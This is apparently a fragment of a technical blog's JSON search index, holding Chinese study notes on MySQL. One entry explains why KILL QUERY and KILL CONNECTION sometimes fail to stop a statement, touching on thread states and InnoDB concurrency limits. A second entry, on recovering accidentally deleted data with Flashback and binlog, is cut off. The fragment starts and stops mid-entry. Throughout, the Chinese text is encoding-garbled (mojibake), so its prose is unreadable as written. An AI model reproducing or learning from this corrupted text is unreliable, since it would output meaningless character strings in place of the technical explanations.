dataâ€ï¼Œå¹¶ä¸ä¸€å®šæ˜¯æŒ‡â€œæ­£åœ¨å‘é€æ•°æ®â€ï¼Œè€Œå¯èƒ½æ˜¯å¤„äºæ‰§è¡Œå™¨è¿‡ç¨‹ä¸­çš„ä»»æ„é˜¶æ®µã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"32 ä¸ºä»€ä¹ˆè¿˜æœ‰killä¸æ‰çš„è¯­å¥","slug":"why-is-there-a-statement-that-cannot-be-killed","date":"2022-08-24T06:40:20.000Z","updated":"2023-02-18T03:28:33.611Z","comments":true,"path":"why-is-there-a-statement-that-cannot-be-killed/","link":"","permalink":"https://www.0x2beace.com/why-is-there-a-statement-that-cannot-be-killed/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ MySQL ä¸­çš„ä¸¤ä¸ª kill å‘½ä»¤çš„åŒºåˆ« ç†è§£ kill å‘½ä»¤èƒŒåçš„åŸç†","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ MySQL ä¸­çš„ä¸¤ä¸ª kill å‘½ä»¤çš„åŒºåˆ« ç†è§£ kill å‘½ä»¤èƒŒåçš„åŸç† åœ¨ MySQL ä¸­æœ‰ä¸¤ä¸ª kill å‘½ä»¤ï¼š ä¸€ä¸ªæ˜¯ kill query + çº¿ç¨‹ idï¼Œè¡¨ç¤ºç»ˆæ­¢è¿™ä¸ªçº¿ç¨‹ä¸­æ­£åœ¨æ‰§ è¡Œçš„è¯­å¥; ä¸€ä¸ªæ˜¯ kill connection + çº¿ç¨‹ idï¼Œè¿™é‡Œ connection å¯ç¼ºçœï¼Œè¡¨ç¤ºæ–­å¼€è¿™ä¸ªçº¿ ç¨‹çš„è¿æ¥ï¼Œå½“ç„¶å¦‚æœè¿™ä¸ªçº¿ç¨‹æœ‰è¯­å¥æ­£åœ¨æ‰§è¡Œï¼Œä¹Ÿæ˜¯è¦å…ˆåœæ­¢æ­£åœ¨æ‰§è¡Œçš„è¯­å¥çš„ã€‚ å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œkill query/connection å‘½ä»¤æ˜¯æœ‰æ•ˆçš„ã€‚æ¯”å¦‚ï¼Œæ‰§è¡Œä¸€ä¸ªæŸ¥è¯¢çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°æ‰§è¡Œæ—¶é—´å¤ªä¹…ï¼Œè¦æ”¾å¼ƒç»§ç»­æŸ¥è¯¢ï¼Œè¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥ç”¨ kill query å‘½ä»¤ï¼Œç»ˆæ­¢è¿™æ¡æŸ¥è¯¢è¯­å¥ã€‚ è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯ï¼Œè¯­å¥å¤„äºé”ç­‰å¾…çš„æ—¶å€™ï¼Œç›´æ¥ä½¿ç”¨ kill å‘½ä»¤ä¹Ÿæ˜¯æœ‰æ•ˆçš„ã€‚æˆ‘ä»¬ä¸€èµ·æ¥çœ‹ä¸‹è¿™ä¸ªä¾‹å­ï¼š å¯ä»¥çœ‹åˆ°ï¼Œsession C æ‰§è¡Œ kill query ä»¥åï¼Œsession B å‡ ä¹åŒæ—¶å°±æç¤ºäº†è¯­å¥è¢«ä¸­æ–­ã€‚ è¿™å°±æ˜¯æˆ‘ä»¬é¢„æœŸçš„ç»“æœã€‚ æ”¶åˆ° kill ä»¥åï¼Œçº¿ç¨‹åšä»€ä¹ˆä½†æ˜¯ï¼Œè¿™é‡Œä½ è¦åœä¸‹æ¥æƒ³ä¸€ä¸‹ï¼šsession B æ˜¯ç›´æ¥ç»ˆæ­¢æ‰çº¿ç¨‹ï¼Œä»€ä¹ˆéƒ½ä¸ç®¡å°±ç›´æ¥é€€å‡ºå—ï¼Ÿæ˜¾ç„¶ï¼Œè¿™æ˜¯ä¸è¡Œçš„ã€‚ å½“å¯¹ä¸€ä¸ªè¡¨åšå¢åˆ æ”¹æŸ¥æ“ä½œæ—¶ï¼Œä¼šåœ¨è¡¨ä¸ŠåŠ  MDL è¯»é”ã€‚æ‰€ä»¥ï¼Œsession B è™½ç„¶å¤„äº blocked çŠ¶æ€ï¼Œä½†è¿˜æ˜¯æ‹¿ç€ä¸€ä¸ª MDL è¯»é”çš„ã€‚å¦‚æœçº¿ç¨‹è¢« kill çš„æ—¶å€™ï¼Œå°±ç›´æ¥ç»ˆæ­¢ï¼Œé‚£ä¹‹åè¿™ä¸ª MDL è¯»é”å°±æ²¡æœºä¼šè¢«é‡Šæ”¾äº†ã€‚ è¿™æ ·çœ‹æ¥ï¼Œkill å¹¶ä¸æ˜¯é©¬ä¸Šåœæ­¢çš„æ„æ€ï¼Œè€Œæ˜¯å‘Šè¯‰æ‰§è¡Œçº¿ç¨‹è¯´ï¼Œè¿™æ¡è¯­å¥å·²ç»ä¸éœ€è¦ç»§ç»­æ‰§è¡Œäº†ï¼Œå¯ä»¥å¼€å§‹â€œæ‰§è¡Œåœæ­¢çš„é€»è¾‘äº†â€ã€‚ å…¶å®ï¼Œè¿™è·Ÿ Linux çš„ kill å‘½ä»¤ç±»ä¼¼ï¼Œkill -N pid å¹¶ä¸æ˜¯è®©è¿›ç¨‹ç›´æ¥åœæ­¢ï¼Œè€Œæ˜¯ç»™è¿›ç¨‹å‘ä¸€ä¸ªä¿¡å·ï¼Œç„¶åè¿›ç¨‹å¤„ç†è¿™ä¸ªä¿¡å·ï¼Œè¿›å…¥ç»ˆæ­¢é€»è¾‘ã€‚åªæ˜¯å¯¹äº MySQL çš„ kill å‘½ä»¤æ¥è¯´ï¼Œä¸éœ€è¦ä¼ ä¿¡å·é‡å‚æ•°ï¼Œå°±åªæœ‰â€œåœæ­¢â€è¿™ä¸ªå‘½ä»¤ã€‚ å®ç°ä¸Šï¼Œå½“ç”¨æˆ·æ‰§è¡Œ kill query thread_id_B æ—¶ï¼ŒMySQL é‡Œå¤„ç† kill å‘½ä»¤çš„çº¿ç¨‹åšäº†ä¸¤ä»¶äº‹ï¼š æŠŠ session B çš„è¿è¡ŒçŠ¶æ€æ”¹æˆ THD::KILL_QUERY(å°†å˜é‡ killed èµ‹å€¼ä¸º THD::KILL_QUERY) ç»™ session B çš„æ‰§è¡Œçº¿ç¨‹å‘ä¸€ä¸ªä¿¡å· ä¸ºä»€ä¹ˆè¦å‘ä¿¡å·å‘¢ï¼Ÿ å› ä¸ºåƒå›¾ 1 çš„æˆ‘ä»¬ä¾‹å­é‡Œé¢ï¼Œsession B å¤„äºé”ç­‰å¾…çŠ¶æ€ï¼Œå¦‚æœåªæ˜¯æŠŠ session B çš„çº¿ç¨‹çŠ¶æ€è®¾ç½® THD::KILL_QUERYï¼Œçº¿ç¨‹ B å¹¶ä¸çŸ¥é“è¿™ä¸ªçŠ¶æ€å˜åŒ–ï¼Œè¿˜æ˜¯ä¼šç»§ç»­ç­‰å¾…ã€‚å‘ä¸€ä¸ªä¿¡å·çš„ç›®çš„ï¼Œå°±æ˜¯è®© session B é€€å‡ºç­‰å¾…ï¼Œæ¥å¤„ç†è¿™ä¸ª THD::KILL_QUERY çŠ¶æ€ã€‚ ä¸Šé¢çš„åˆ†æä¸­ï¼Œéšå«äº†è¿™ä¹ˆä¸‰å±‚æ„æ€ï¼š ä¸€ä¸ªè¯­å¥æ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰å¤šå¤„â€œåŸ‹ç‚¹â€ï¼Œåœ¨è¿™äº›â€œåŸ‹ç‚¹â€çš„åœ°æ–¹åˆ¤æ–­çº¿ç¨‹çŠ¶æ€ï¼Œå¦‚æœå‘ç°çº¿ç¨‹çŠ¶æ€æ˜¯ THD::KILL_QUERYï¼Œæ‰å¼€å§‹è¿›å…¥è¯­å¥ç»ˆæ­¢é€»è¾‘ å¦‚æœå¤„äºç­‰å¾…çŠ¶æ€ï¼Œå¿…é¡»æ˜¯ä¸€ä¸ªå¯ä»¥è¢«å”¤é†’çš„ç­‰å¾…ï¼Œå¦åˆ™æ ¹æœ¬ä¸ä¼šæ‰§è¡Œåˆ°â€œåŸ‹ç‚¹â€å¤„ è¯­å¥ä»å¼€å§‹è¿›å…¥ç»ˆæ­¢é€»è¾‘ï¼Œåˆ°ç»ˆæ­¢é€»è¾‘å®Œå…¨å®Œæˆï¼Œæ˜¯æœ‰ä¸€ä¸ªè¿‡ç¨‹çš„ æ‰€ä»¥ kill æ“ä½œï¼Œä¸æ˜¯è¯´åœå°±åœçš„ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å†çœ‹ä¸€ä¸ª kill ä¸æ‰çš„ä¾‹å­ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨å‰é¢ç¬¬ 29 ç¯‡æ–‡ç« ä¸­æåˆ°çš„ innodb_thread_concurrency ä¸å¤Ÿç”¨çš„ä¾‹å­ã€‚ é¦–å…ˆï¼Œæ‰§è¡Œ set global innodb_thread_concurrency=2ï¼Œå°† InnoDB çš„å¹¶å‘çº¿ç¨‹ä¸Šé™æ•° è®¾ç½®ä¸º 2;ç„¶åï¼Œæ‰§è¡Œä¸‹é¢çš„åºåˆ—ï¼š å¯ä»¥çœ‹åˆ°ï¼š sesssion C æ‰§è¡Œçš„æ—¶å€™è¢«å µä½äº†ï¼› ä½†æ˜¯ session D æ‰§è¡Œçš„ kill query C å‘½ä»¤å´æ²¡ä»€ä¹ˆæ•ˆæœ ç›´åˆ° session E æ‰§è¡Œäº† kill connection å‘½ä»¤ï¼Œæ‰æ–­å¼€äº† session C çš„è¿æ¥ï¼Œæç¤ºâ€œLost connection to MySQL server during queryâ€ ä½†æ˜¯è¿™æ—¶å€™ï¼Œå¦‚æœåœ¨ session E ä¸­æ‰§è¡Œ show processlistï¼Œä½ å°±èƒ½çœ‹åˆ°ä¸‹é¢è¿™ä¸ªå›¾ è¿™æ—¶å€™ï¼Œid=12 è¿™ä¸ªçº¿ç¨‹çš„ Commnad åˆ—æ˜¾ç¤ºçš„æ˜¯ Killedã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®¢æˆ·ç«¯è™½ç„¶æ–­å¼€äº†è¿æ¥ï¼Œä½†å®é™…ä¸ŠæœåŠ¡ç«¯ä¸Šè¿™æ¡è¯­å¥è¿˜åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ã€‚ ä¸ºä»€ä¹ˆåœ¨æ‰§è¡Œ kill query å‘½ä»¤æ—¶ï¼Œè¿™æ¡è¯­å¥ä¸åƒç¬¬ä¸€ä¸ªä¾‹å­çš„ update è¯­å¥ä¸€æ ·é€€å‡ºå‘¢ï¼Ÿ åœ¨å®ç°ä¸Šï¼Œç­‰è¡Œé”æ—¶ï¼Œä½¿ç”¨çš„æ˜¯ pthread_cond_timedwait å‡½æ•°ï¼Œè¿™ä¸ªç­‰å¾…çŠ¶æ€å¯ä»¥è¢«å”¤é†’ã€‚ä½†æ˜¯ï¼Œåœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œ12 å·çº¿ç¨‹çš„ç­‰å¾…é€»è¾‘æ˜¯è¿™æ ·çš„ï¼šæ¯ 10 æ¯«ç§’åˆ¤æ–­ä¸€ä¸‹æ˜¯å¦å¯ä»¥è¿›å…¥ InnoDB æ‰§è¡Œï¼Œå¦‚æœä¸è¡Œï¼Œå°±è°ƒç”¨ nanosleep å‡½æ•°è¿›å…¥ sleep çŠ¶æ€ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œè™½ç„¶ 12 å·çº¿ç¨‹çš„çŠ¶æ€å·²ç»è¢«è®¾ç½®æˆäº† KILL_QUERYï¼Œä½†æ˜¯åœ¨è¿™ä¸ªç­‰å¾…è¿›å…¥ InnoDB çš„å¾ªç¯è¿‡ç¨‹ä¸­ï¼Œå¹¶æ²¡æœ‰å»åˆ¤æ–­çº¿ç¨‹çš„çŠ¶æ€ï¼Œå› æ­¤æ ¹æœ¬ä¸ä¼šè¿›å…¥ç»ˆæ­¢é€»è¾‘é˜¶æ®µã€‚ è€Œå½“ session E æ‰§è¡Œ kill connection å‘½ä»¤æ—¶ï¼Œæ˜¯è¿™ä¹ˆåšçš„ï¼š æŠŠ 12 å·çº¿ç¨‹çŠ¶æ€è®¾ç½®ä¸º KILL_CONNECTION å…³æ‰ 12 å·çº¿ç¨‹çš„ç½‘ç»œè¿æ¥ã€‚å› ä¸ºæœ‰è¿™ä¸ªæ“ä½œï¼Œæ‰€ä»¥ä½ ä¼šçœ‹åˆ°ï¼Œè¿™æ—¶å€™ session C æ”¶åˆ°äº†æ–­å¼€è¿æ¥çš„æç¤º é‚£ä¸ºä»€ä¹ˆæ‰§è¡Œ show processlist çš„æ—¶å€™ï¼Œä¼šçœ‹åˆ° Command åˆ—æ˜¾ç¤ºä¸º killed å‘¢ï¼Ÿå…¶å®ï¼Œè¿™å°±æ˜¯å› ä¸ºåœ¨æ‰§è¡Œ show processlist çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªç‰¹åˆ«çš„é€»è¾‘ï¼šå¦‚æœä¸€ä¸ªçº¿ç¨‹çš„çŠ¶æ€æ˜¯ KILL_CONNECTIONï¼Œå°±æŠŠ Command åˆ—æ˜¾ç¤ºæˆ Killedã€‚ æ‰€ä»¥å…¶å®ï¼Œå³ä½¿æ˜¯å®¢æˆ·ç«¯é€€å‡ºäº†ï¼Œè¿™ä¸ªçº¿ç¨‹çš„çŠ¶æ€ä»ç„¶æ˜¯åœ¨ç­‰å¾…ä¸­ã€‚ é‚£è¿™ä¸ªçº¿ç¨‹ä»€ä¹ˆæ—¶å€™ä¼šé€€å‡ºå‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ï¼Œåªæœ‰ç­‰åˆ°æ»¡è¶³è¿›å…¥ InnoDB çš„æ¡ä»¶åï¼Œsession C çš„æŸ¥è¯¢è¯­å¥ç»§ç»­æ‰§è¡Œï¼Œç„¶åæ‰æœ‰å¯èƒ½åˆ¤æ–­åˆ°çº¿ç¨‹çŠ¶æ€å·²ç»å˜æˆäº† KILL_QUERY æˆ–è€… KILL_CONNECTIONï¼Œå†è¿›å…¥ç»ˆæ­¢é€»è¾‘é˜¶æ®µã€‚ åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬æ¥å°ç»“ä¸€ä¸‹ã€‚ è¿™ä¸ªä¾‹å­æ˜¯ kill æ— æ•ˆçš„ç¬¬ä¸€ç±»æƒ…å†µï¼Œå³ï¼šçº¿ç¨‹æ²¡æœ‰æ‰§è¡Œåˆ°åˆ¤æ–­çº¿ç¨‹çŠ¶æ€çš„é€»è¾‘ã€‚ è·Ÿè¿™ç§æƒ…å†µç›¸åŒçš„ï¼Œè¿˜æœ‰ç”±äº IO å‹åŠ›è¿‡å¤§ï¼Œè¯»å†™ IO çš„å‡½æ•°ä¸€ç›´æ— æ³•è¿”å›ï¼Œå¯¼è‡´ä¸èƒ½åŠæ—¶åˆ¤æ–­çº¿ç¨‹çš„çŠ¶æ€ã€‚ å¦ä¸€ç±»æƒ…å†µæ˜¯ï¼Œç»ˆæ­¢é€»è¾‘è€—æ—¶è¾ƒé•¿ã€‚ è¿™æ—¶å€™ï¼Œä» show processlist ç»“æœä¸Šçœ‹ä¹Ÿæ˜¯ Command=Killedï¼Œéœ€è¦ç­‰åˆ°ç»ˆæ­¢é€»è¾‘å®Œæˆï¼Œè¯­å¥æ‰ç®—çœŸæ­£å®Œæˆã€‚è¿™ç±»æƒ…å†µï¼Œæ¯”è¾ƒå¸¸è§çš„åœºæ™¯æœ‰ä»¥ä¸‹å‡ ç§ï¼š è¶…å¤§äº‹åŠ¡æ‰§è¡ŒæœŸé—´è¢« killã€‚è¿™æ—¶å€™ï¼Œå›æ»šæ“ä½œéœ€è¦å¯¹äº‹åŠ¡æ‰§è¡ŒæœŸé—´ç”Ÿæˆçš„æ‰€æœ‰æ–°æ•°æ®ç‰ˆæœ¬åšå›æ”¶æ“ä½œï¼Œè€—æ—¶å¾ˆé•¿ã€‚ å¤§æŸ¥è¯¢å›æ»šã€‚å¦‚æœæŸ¥è¯¢è¿‡ç¨‹ä¸­ç”Ÿæˆäº†æ¯”è¾ƒå¤§çš„ä¸´æ—¶æ–‡ä»¶ï¼ŒåŠ ä¸Šæ­¤æ—¶æ–‡ä»¶ç³»ç»Ÿå‹åŠ›å¤§ï¼Œåˆ é™¤ä¸´æ—¶æ–‡ä»¶å¯èƒ½éœ€è¦ç­‰å¾… IO èµ„æºï¼Œå¯¼è‡´è€—æ—¶è¾ƒé•¿ã€‚ DDL å‘½ä»¤æ‰§è¡Œåˆ°æœ€åé˜¶æ®µï¼Œå¦‚æœè¢« killï¼Œéœ€è¦åˆ é™¤ä¸­é—´è¿‡ç¨‹çš„ä¸´æ—¶æ–‡ä»¶ï¼Œä¹Ÿå¯èƒ½å— IO èµ„æºå½±å“è€—æ—¶è¾ƒä¹…ã€‚ è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼šå¦‚æœç›´æ¥åœ¨å®¢æˆ·ç«¯é€šè¿‡ Ctrl+C å‘½ä»¤ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥ç›´æ¥ç»ˆæ­¢çº¿ç¨‹å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ï¼Œä¸å¯ä»¥ã€‚ è¿™æ˜¯å› ä¸ºï¼Œå…¶å®åœ¨å®¢æˆ·ç«¯çš„æ“ä½œåªèƒ½æ“ä½œåˆ°å®¢æˆ·ç«¯çš„çº¿ç¨‹ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åªèƒ½é€šè¿‡ç½‘ç»œäº¤äº’ï¼Œæ˜¯ä¸å¯èƒ½ç›´æ¥æ“ä½œæœåŠ¡ç«¯çº¿ç¨‹çš„ã€‚ è€Œç”±äº MySQL æ˜¯åœç­‰åè®®ï¼Œæ‰€ä»¥è¿™ä¸ªçº¿ç¨‹æ‰§è¡Œçš„è¯­å¥è¿˜æ²¡æœ‰è¿”å›çš„æ—¶å€™ï¼Œå†å¾€è¿™ä¸ªè¿æ¥é‡Œé¢ç»§ç»­å‘å‘½ä»¤ä¹Ÿæ˜¯æ²¡æœ‰ç”¨çš„ã€‚å®é™…ä¸Šï¼Œæ‰§è¡Œ Ctrl+C çš„æ—¶å€™ï¼Œæ˜¯ MySQL å®¢æˆ·ç«¯å¦å¤–å¯åŠ¨ä¸€ä¸ªè¿æ¥ï¼Œç„¶åå‘é€ä¸€ä¸ª kill query å‘½ä»¤ã€‚ æ‰€ä»¥ï¼Œä½ å¯åˆ«ä»¥ä¸ºåœ¨å®¢æˆ·ç«¯æ‰§è¡Œå®Œ Ctrl+C å°±ä¸‡äº‹å¤§å‰äº†ã€‚å› ä¸ºï¼Œè¦ kill æ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œè¿˜æ¶‰åŠåˆ°åç«¯çš„å¾ˆå¤šæ“ä½œã€‚ å…³äºå®¢æˆ·ç«¯çš„å¦ä¸€ä¸ªè¯¯è§£æœ€å¸¸è§çš„ä¸€ä¸ªè¯¯è§£å°±æ˜¯ï¼šå¦‚æœåº“é‡Œé¢çš„è¡¨ç‰¹åˆ«å¤šï¼Œè¿æ¥å°±ä¼šå¾ˆæ…¢ã€‚ ä»ç¬¬ä¸€ç¯‡æ–‡ç« å°±å¯ä»¥çŸ¥é“ï¼Œæ¯ä¸ªå®¢æˆ·ç«¯åœ¨å’ŒæœåŠ¡ç«¯å»ºç«‹è¿æ¥çš„æ—¶å€™ï¼Œéœ€è¦åšçš„äº‹æƒ…å°±æ˜¯ TCP æ¡æ‰‹ã€ç”¨æˆ·æ ¡éªŒã€è·å–æƒé™ã€‚ä½†è¿™å‡ ä¸ªæ“ä½œï¼Œæ˜¾ç„¶è·Ÿåº“é‡Œé¢è¡¨çš„ä¸ªæ•°æ— å…³ã€‚ ä½†å®é™…ä¸Šï¼Œæ­£å¦‚å›¾ä¸­çš„æ–‡å­—æç¤ºæ‰€è¯´çš„ï¼Œå½“ä½¿ç”¨é»˜è®¤å‚æ•°è¿æ¥çš„æ—¶å€™ï¼ŒMySQL å®¢æˆ·ç«¯ä¼šæä¾›ä¸€ä¸ªæœ¬åœ°åº“åå’Œè¡¨åè¡¥å…¨çš„åŠŸèƒ½ã€‚ä¸ºäº†å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œå®¢æˆ·ç«¯åœ¨è¿æ¥æˆåŠŸåï¼Œéœ€è¦å¤šåšä¸€äº›æ“ä½œï¼š æ‰§è¡Œ show databasesï¼› åˆ‡åˆ°æŒ‡å®šåº“ï¼Œæ‰§è¡Œ show tablesï¼› æŠŠè¿™ä¸¤ä¸ªå‘½ä»¤çš„ç»“æœç”¨äºæ„å»ºä¸€ä¸ªæœ¬åœ°çš„å“ˆå¸Œè¡¨ åœ¨è¿™äº›æ“ä½œä¸­ï¼Œæœ€èŠ±æ—¶é—´çš„å°±æ˜¯ç¬¬ä¸‰æ­¥åœ¨æœ¬åœ°æ„å»ºå“ˆå¸Œè¡¨çš„æ“ä½œï¼ˆç”¨äº Tab é”®è‡ªåŠ¨è¡¥å…¨è¡¨åæˆ–è€…æ˜¾ç¤ºæç¤ºï¼‰ã€‚æ‰€ä»¥ï¼Œå½“ä¸€ä¸ªåº“ä¸­çš„è¡¨ä¸ªæ•°éå¸¸å¤šçš„æ—¶å€™ï¼Œè¿™ä¸€æ­¥å°±ä¼šèŠ±æ¯”è¾ƒé•¿çš„æ—¶é—´ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æ„ŸçŸ¥åˆ°çš„è¿æ¥è¿‡ç¨‹æ…¢ï¼Œå…¶å®å¹¶ä¸æ˜¯è¿æ¥æ…¢ï¼Œä¹Ÿä¸æ˜¯æœåŠ¡ç«¯æ…¢ï¼Œè€Œæ˜¯å®¢æˆ·ç«¯æ…¢ã€‚ MySQL å®¢æˆ·ç«¯å‘é€è¯·æ±‚åï¼Œæ¥æ”¶æœåŠ¡ç«¯è¿”å›ç»“æœçš„æ–¹å¼æœ‰ä¸¤ç§ï¼š ä¸€ç§æ˜¯æœ¬åœ°ç¼“å­˜ï¼Œä¹Ÿå°±æ˜¯åœ¨æœ¬åœ°å¼€ä¸€ç‰‡å†…å­˜ï¼Œå…ˆæŠŠç»“æœå­˜èµ·æ¥ã€‚å¦‚æœä½ ç”¨ API å¼€å‘ï¼Œå¯¹åº”çš„å°±æ˜¯ mysql_store_result æ–¹æ³•ã€‚ å¦ä¸€ç§æ˜¯ä¸ç¼“å­˜ï¼Œè¯»ä¸€ä¸ªå¤„ç†ä¸€ä¸ªã€‚å¦‚æœä½ ç”¨ API å¼€å‘ï¼Œå¯¹åº”çš„å°±æ˜¯ mysql_use_result æ–¹æ³•ã€‚ MySQL å®¢æˆ·ç«¯é»˜è®¤é‡‡ç”¨ç¬¬ä¸€ç§æ–¹å¼ï¼Œè€Œå¦‚æœåŠ ä¸Šâ€“quick å‚æ•°ï¼Œå°±ä¼šä½¿ç”¨ç¬¬äºŒç§ä¸ç¼“å­˜çš„æ–¹å¼ã€‚ è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ¡ˆæœ‰ä¸¤ä¸ªï¼š åœ¨è¿æ¥å‘½ä»¤ä¸­åŠ ä¸Š -A å‚æ•° æˆ–è€…åœ¨è¿æ¥å‘½ä»¤ä¸­åŠ  â€“quick(æˆ–è€…ç®€å†™ä¸º -q) å‚æ•° ä¸¤ä¸ªå‚æ•°éƒ½å¯ä»¥è·³è¿‡è¡¨åè‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ã€‚ æ€»ç»“ Mysql kill ä¸æ‰çš„æƒ…å†µï¼Œå…¶å®æ˜¯å› ä¸ºå‘é€ kill å‘½ä»¤çš„å®¢æˆ·ç«¯ï¼Œå¹¶æ²¡æœ‰å¼ºè¡Œåœæ­¢ç›®æ ‡çº¿ç¨‹çš„æ‰§è¡Œï¼Œè€Œåªæ˜¯è®¾ç½®äº†ä¸ªçŠ¶æ€ï¼Œå¹¶å”¤é†’å¯¹åº”çš„çº¿ç¨‹ã€‚è€Œè¢« kill çš„çº¿ç¨‹ï¼Œéœ€è¦æ‰§è¡Œåˆ°åˆ¤æ–­çŠ¶æ€çš„â€œåŸ‹ç‚¹â€ï¼Œæ‰ä¼šå¼€å§‹è¿›å…¥ç»ˆæ­¢é€»è¾‘é˜¶æ®µã€‚å¹¶ä¸”ï¼Œç»ˆæ­¢é€»è¾‘æœ¬èº«ä¹Ÿæ˜¯éœ€è¦è€—è´¹æ—¶é—´çš„ã€‚ kill connection æœ¬è´¨ä¸Šåªæ˜¯æŠŠå®¢æˆ·ç«¯çš„ sql è¿æ¥æ–­å¼€ï¼Œåé¢çš„æ‰§è¡Œæµç¨‹è¿˜æ˜¯è¦èµ° kill query","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"31 è¯¯åˆ æ•°æ®åé™¤äº†è·‘è·¯ï¼Œè¿˜èƒ½æ€ä¹ˆåŠ","slug":"after-accidentally-deleting-data-what-else-can-I-do-besides-running-away","date":"2022-08-23T02:03:15.000Z","updated":"2023-02-18T03:28:33.573Z","comments":true,"path":"after-accidentally-deleting-data-what-else-can-I-do-besides-running-away/","link":"","permalink":"https://www.0x2beace.com/after-accidentally-deleting-data-what-else-can-I-do-besides-running-away/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£äº†ä¸åŒç±»å‹çš„è¯¯åˆ æ•°æ®ä¹‹åçš„è§£å†³æ–¹æ¡ˆ äº†è§£é¢„é˜²è¯¯åˆ åº“/è¡¨çš„æ–¹æ³•","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£äº†ä¸åŒç±»å‹çš„è¯¯åˆ æ•°æ®ä¹‹åçš„è§£å†³æ–¹æ¡ˆ äº†è§£é¢„é˜²è¯¯åˆ åº“/è¡¨çš„æ–¹æ³• ä¸ºäº†æ‰¾åˆ°è§£å†³è¯¯åˆ æ•°æ®çš„æ›´é«˜æ•ˆçš„æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå¯¹å’Œ MySQL ç›¸å…³çš„è¯¯åˆ æ•°æ®ï¼Œåšä¸‹ åˆ†ç±»: ä½¿ç”¨ delete è¯­å¥è¯¯åˆ æ•°æ®è¡Œ ä½¿ç”¨ drop table æˆ–è€… truncate table è¯­å¥è¯¯åˆ æ•°æ®è¡¨ ä½¿ç”¨ drop database è¯­å¥è¯¯åˆ æ•°æ®åº“ ä½¿ç”¨ rm å‘½ä»¤è¯¯åˆ æ•´ä¸ª MySQL å®ä¾‹ è¯¯åˆ è¡Œå¦‚æœæ˜¯ä½¿ç”¨ delete è¯­å¥è¯¯åˆ äº†æ•°æ®è¡Œï¼Œå¯ä»¥ç”¨ Flashback å·¥ å…·é€šè¿‡é—ªå›æŠŠæ•°æ®æ¢å¤å›æ¥ã€‚ Flashback æ¢å¤æ•°æ®çš„åŸç†ï¼Œæ˜¯ä¿®æ”¹ binlog çš„å†…å®¹ï¼Œæ‹¿å›åŸåº“é‡æ”¾ã€‚è€Œèƒ½å¤Ÿä½¿ç”¨è¿™ä¸ªæ–¹æ¡ˆ çš„å‰ææ˜¯ï¼Œéœ€è¦ç¡®ä¿ binlog_format=row å’Œ binlog_row_image=FULLã€‚å…·ä½“æ¢å¤æ•°æ®æ—¶ï¼Œå¯¹å•ä¸ªäº‹åŠ¡åšå¦‚ä¸‹å¤„ç†: å¯¹äº insert è¯­å¥ï¼Œå¯¹åº”çš„ binlog event ç±»å‹æ˜¯ Write_rows eventï¼ŒæŠŠå®ƒæ”¹æˆ Delete_rows event å³å¯; åŒç†ï¼Œå¯¹äº delete è¯­å¥ï¼Œä¹Ÿæ˜¯å°† 